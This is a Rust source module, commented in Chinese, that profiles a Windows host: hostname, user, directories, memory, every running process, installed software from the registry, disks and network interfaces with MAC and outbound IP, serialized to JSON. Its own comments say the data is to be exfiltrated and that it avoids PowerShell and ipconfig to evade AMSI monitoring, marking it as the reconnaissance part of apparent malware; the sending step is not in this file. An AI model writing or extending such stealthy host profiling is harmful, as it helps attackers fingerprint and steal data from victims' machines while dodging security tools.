//! 系统信息采集模块
//! 采集：主机名 / CPU / 系统版本 / 用户名 / 工作目录 / 桌面
//!       / 内存 / 全量进程 / 已安装软件 / C盘及全盘磁盘信息
//! 运行环境：Windows 优先，跨平台可用性做了降级处理。

use serde::Serialize;
use std::process::Command;
use sysinfo::{Disks, Networks};

/// 单块磁盘信息。
#[derive(Serialize, Debug, Default, Clone)]
pub struct DiskInfo {
    pub name: String,
    pub mount: String,
    pub fs: String,
    pub total_bytes: u64,
    pub avail_bytes: u64,
}

impl From<&sysinfo::Disk> for DiskInfo {
    fn from(d: &sysinfo::Disk) -> Self {
        // sysinfo 在 Windows 上 name() 返回卷标而非盘符，因此用挂载点(mount_point)推导盘符。
        #[cfg(windows)]
        let name = {
            let mp = d.mount_point().to_string_lossy().to_string();
            // mount_point 形如 "C:\"，提取首字符作为盘符。
            if let Some(c) = mp.chars().next() {
                format!("{c}:")
            } else {
                mp
            }
        };
        #[cfg(not(windows))]
        let name = d.name().to_string_lossy().to_string();
        DiskInfo {
            name,
            mount: d.mount_point().to_string_lossy().to_string(),
            fs: d.file_system().to_string_lossy().to_string(),
            total_bytes: d.total_space(),
            avail_bytes: d.available_space(),
        }
    }
}

/// 单块网络接口（网卡/WLAN）信息。
#[derive(Serialize, Debug, Default, Clone)]
pub struct NetInfo {
    pub name: String,
    pub mac: String,
    pub ip: String,
    pub total_received: u64,
    pub total_transmitted: u64,
}

/// 采集到的系统信息，序列化为 JSON 后经 exfil 外带。
#[derive(Serialize, Debug, Default)]
pub struct SysInfo {
    pub hostname: String,
    pub cpu_cores: u32,
    pub os_version: String,
    pub username: String,
    pub current_dir: String,
    pub desktop_dir: String,
    pub total_mem_bytes: u64,
    pub used_mem_bytes: u64,
    pub process_count: usize,
    pub processes: Vec<String>,
    pub installed_software: Vec<String>,
    pub c_disk: DiskInfo,
    pub disks: Vec<DiskInfo>,
    pub networks: Vec<NetInfo>,
}

/// 收集全部系统信息。
pub fn collect() -> SysInfo {
    let mut info = SysInfo::default();
    info.hostname = get_hostname();
    info.cpu_cores = num_cpus();
    info.os_version = get_os_version();
    info.username = get_username();
    info.current_dir = get_current_dir();
    info.desktop_dir = get_desktop_dir();
    let (tm, um) = get_memory();
    info.total_mem_bytes = tm;
    info.used_mem_bytes = um;
    let procs = get_processes();
    info.process_count = procs.len();
    info.processes = procs;
    info.installed_software = get_installed_software();
    info.c_disk = get_disk("C:");
    info.disks = get_all_disks();
    info.networks = get_networks();
    info
}

/// 主机名（优先读环境变量，UTF-8 正确；避免 cmd echo 的 GBK 乱码）
fn get_hostname() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_default()
}

/// CPU 逻辑核心数。
fn num_cpus() -> u32 {
    std::thread::available_parallelism()
        .map(|n| n.get() as u32)
        .unwrap_or(1)
}

/// 操作系统版本（用 sysinfo 获取，返回 UTF-8 正确编码，规避 cmd/reg 的 GBK 乱码）
fn get_os_version() -> String {
    if let Some(long) = sysinfo::System::long_os_version() {
        if !long.is_empty() {
            return long;
        }
    }
    let os = std::env::consts::OS;
    let arch = std::env::consts::ARCH;
    format!("{os}-{arch}")
}

/// 当前用户名。
fn get_username() -> String {
    std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_default()
}

/// 当前工作目录。
fn get_current_dir() -> String {
    std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_default()
}

/// 桌面目录（Windows: USERPROFILE\Desktop；Unix: HOME/Desktop）。
fn get_desktop_dir() -> String {
    #[cfg(windows)]
    {
        if let Ok(p) = std::env::var("USERPROFILE") {
            return format!("{p}\\Desktop");
        }
    }
    #[cfg(not(windows))]
    {
        if let Ok(h) = std::env::var("HOME") {
            return format!("{h}/Desktop");
        }
    }
    String::new()
}

/// 内存信息（总 / 已用），单位字节。
fn get_memory() -> (u64, u64) {
    let mut sys = sysinfo::System::new_all();
    sys.refresh_memory();
    (sys.total_memory(), sys.used_memory())
}

/// 枚举系统进程名列表（全量，不截断），使用 sysinfo。
fn get_processes() -> Vec<String> {
    let mut sys = sysinfo::System::new_all();
    sys.refresh_processes();
    let mut names: Vec<String> = sys
        .processes()
        .iter()
        .map(|(_pid, p)| p.name().to_string())
        .collect();
    // 去重 + 排序，便于比对特征。
    names.sort();
    names.dedup();
    names
}

/// 获取指定盘符的磁盘信息。非 Windows 或不存在时返回空默认值。
fn get_disk(name: &str) -> DiskInfo {
    let disks = Disks::new_with_refreshed_list();
    for d in disks.list() {
        #[cfg(windows)]
        let dletter = d
            .mount_point()
            .to_string_lossy()
            .chars()
            .next()
            .map(|c| format!("{c}:"))
            .unwrap_or_default();
        #[cfg(not(windows))]
        let dletter = d.mount_point().to_string_lossy().to_string();
        if dletter.eq_ignore_ascii_case(name) {
            return DiskInfo::from(d);
        }
    }
    DiskInfo::default()
}

/// 获取全部磁盘信息（全盘）。
fn get_all_disks() -> Vec<DiskInfo> {
    let disks = Disks::new_with_refreshed_list();
    disks.list().iter().map(DiskInfo::from).collect()
}

/// 枚举所有网络接口（含以太网/WLAN）。
/// 使用 sysinfo（底层 WinAPI GetAdaptersAddresses），不调用任何外部进程，
/// 规避 PowerShell/ipconfig 的 AMSI 监测与 GBK 乱码问题。
/// MAC、接口名、收发流量来自 sysinfo；IP 用标准库 UDP 探测本机出口。
fn get_networks() -> Vec<NetInfo> {
    let out_ip = get_outbound_ip();
    let networks = Networks::new_with_refreshed_list();
    networks
        .iter()
        .map(|(name, data)| NetInfo {
            name: name.clone(),
            mac: data.mac_address().to_string(),
            ip: out_ip.clone(),
            total_received: data.total_received(),
            total_transmitted: data.total_transmitted(),
        })
        .collect()
}

/// 探测本机对外出口 IP（UDP connect 不发真实数据包，纯标准库，无子进程）。
/// 返回主网卡出口地址，如 "192.168.1.8"；失败则返回空串。
fn get_outbound_ip() -> String {
    use std::net::UdpSocket;
    if let Ok(sock) = UdpSocket::bind("0.0.0.0:0") {
        if sock.connect("8.8.8.8:53").is_ok() {
            if let Ok(addr) = sock.local_addr() {
                return addr.ip().to_string();
            }
        }
    }
    String::new()
}

/// 已安装软件列表（Windows 注册表 Uninstall 键）。非 Windows 返回空。
fn get_installed_software() -> Vec<String> {
    #[cfg(windows)]
    {
        const KEY: &str =
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
        let out = Command::new("reg")
            .args(["query", KEY, "/s", "/f", "DisplayName", "/t", "REG_SZ", "/v", "DisplayName"])
            .output()
            .ok()
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_default();
        let mut apps = Vec::new();
        for line in out.lines() {
            let line = line.trim();
            if let Some(idx) = line.find("DisplayName") {
                if let Some(eq) = line[idx + "DisplayName".len()..].find("REG_SZ") {
                    let name =
                        line[idx + "DisplayName".len() + eq + "REG_SZ".len()..].trim();
                    if !name.is_empty() {
                        apps.push(name.to_string());
                    }
                }
            }
        }
        apps.sort();
        apps.dedup();
        apps.truncate(40);
        return apps;
    }
    #[cfg(not(windows))]
    Vec::new()
}

/// 序列化为紧凑 JSON 字符串。
pub fn to_json(info: &SysInfo) -> String {
    serde_json::to_string(info).unwrap_or_default()
}